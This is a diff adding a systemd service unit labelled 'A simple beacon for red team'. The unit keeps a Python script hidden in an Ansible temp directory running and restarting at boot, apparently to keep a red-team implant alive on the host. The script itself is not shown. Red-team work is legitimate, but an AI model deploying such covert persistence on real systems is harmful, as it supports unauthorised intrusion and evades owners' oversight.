@@ -1,0 +1,16 @@
+[Unit]
+Description=A simple beacon for red team
+After=network.target
+StartLimitIntervalSec=0
+StartLimitBurst=5
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=sysadmin
+ExecStart=/home/sysadmin/.ansible/tmp/python/waffle.py
+
+[Install]
+WantedBy=multi-user.target
